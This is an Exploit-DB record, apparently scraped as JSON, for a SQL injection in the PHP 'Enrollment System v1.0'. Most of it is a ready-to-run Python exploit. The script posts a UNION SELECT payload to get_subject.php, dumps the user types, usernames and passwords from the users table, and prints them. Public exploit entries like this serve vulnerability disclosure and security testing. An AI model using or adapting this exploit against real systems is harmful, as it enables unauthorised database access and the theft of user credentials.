{"source": "https://www.exploit-db.com/exploits/51845", "vulnName": "Enrollment System v1.0 - SQL Injection", "vulnEDBID": "51845", "vulnCVE": "N/A", "author": "GNANARAJ MAUVIEL", "exploitType": "REMOTE", "platform": "PHP", "datePublished": "2024-03-03", "vulnContent": "# Exploit Title: Enrollment System v1.0 - SQL Injection\n# Date: 27 December 2023\n# Exploit Author: Gnanaraj Mauviel (@0xm3m)\n# Vendor: Obi08\n# Vendor Homepage: https://github.com/Obi08/Enrollment_System\n# Software Link: https://github.com/Obi08/Enrollment_System\n# Version: v1.0\n# Tested on: Mac OSX, XAMPP, Apache, MySQL\n\n-------------------------------------------------------------------------------------------------------------------------------------------\n\nfrom bs4 import BeautifulSoup\nimport requests\nimport urllib3\n\n#The Config class defines three class attributes: BASE_URL, URI, and PAYLOAD.\n\n#BASE_URL is set to the string \"http://localhost/enrollment_system\".\n#URI is set to the string \"/get_subject.php\".\n#PAYLOAD is set to the string \"emc' union select 1,concat(user_type,'::',username,'::',password),3,4,5,6 from users-- -\".\n\nclass Config:\n    BASE_URL = \"http://localhost/enrollment_system\"\n    URI = '/get_subject.php'\n    PAYLOAD = \"emc' union select 1,concat(user_type,'::',username,'::',password),3,4,5,6 from users-- -\"\n\nurllib3.disable_warnings()\nproxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}\n\n#This code defines a function called exploit_sqli that exploits a SQL injection vulnerability in a given URL. It takes in a requests.Session object and a Config object as parameters. The function constructs a URL using the BASE_URL and URI properties from the Config object, and creates a dictionary of parameters with a key of 'keyword' and a value of the PAYLOAD property from the Config object.\n#The function then tries to make a request using the make_request function and returns the response text if successful. If an exception is raised during the request, it prints an error message and returns an empty string.\n\ndef exploit_sqli(session: requests.Session, config: Config) -> str:\n    \"\"\"\n    Exploits SQL injection vulnerability in the given URL.\n\n    Args:\n        session (requests.Session): The session object to use for making the request.\n        config (Config): Configuration object containing base URL, URI, and payload.\n\n    Returns:\n        str: The response text from the request.\n    \"\"\"\n    url = f\"{config.BASE_URL}{config.URI}\"\n    params = {'keyword': config.PAYLOAD}\n    \n    try:\n        response = make_request(session, url, params)\n        return response.text\n    except requests.RequestException as e:\n        print(f\"Request failed: {e}\")\n        return \"\"\n    \n#This code defines a function called make_request that takes in a requests.Session object, a URL string, and a dictionary of parameters. It makes a POST request using the provided session and parameters, and returns the response object. The function has type hints indicating the types of the arguments and the return value.    \n\ndef make_request(session: requests.Session, url: str, params: dict) -> requests.Response:\n    \"\"\"\n    Make a POST request with error handling.\n\n    Args:\n        session (requests.Session): The session object to use for making the request.\n        url (str): The URL to send the request to.\n        params (dict): The parameters to include in the request.\n\n    Returns:\n        requests.Response: The response object.\n    \"\"\"\n    return session.post(url, data=params, verify=False, proxies=proxies)\n\n#This code snippet defines a function called parse_html that takes a string parameter response_text. It uses the BeautifulSoup library to parse the HTML in response_text and extract specific data from it. It finds all <tr> elements in the HTML, skips the header row, and then iterates over the remaining rows. For each row, it finds all <td> elements and extracts the text content from the second and third column. Finally, it prints a formatted string that includes the extracted data.\n\ndef parse_html(response_text: str):\n    soup = BeautifulSoup(response_text, 'html.parser')\n    rows = soup.find_all('tr')[1:]  # Skip the header row\n\n    for row in rows:\n        columns = row.find_all('td')\n        if columns:\n            subject_code = columns[1].text.strip()\n            subject_description = columns[2].text.strip()\n            print(f\"User_Type::Username::Password == {subject_code}\")\n\nif __name__ == \"__main__\":\n    # file deepcode ignore MissingClose: <please specify a reason of ignoring this>\n    session = requests.Session()\n    response = exploit_sqli(session, Config)\n    \n    if response:\n        parse_html(response)\n            "}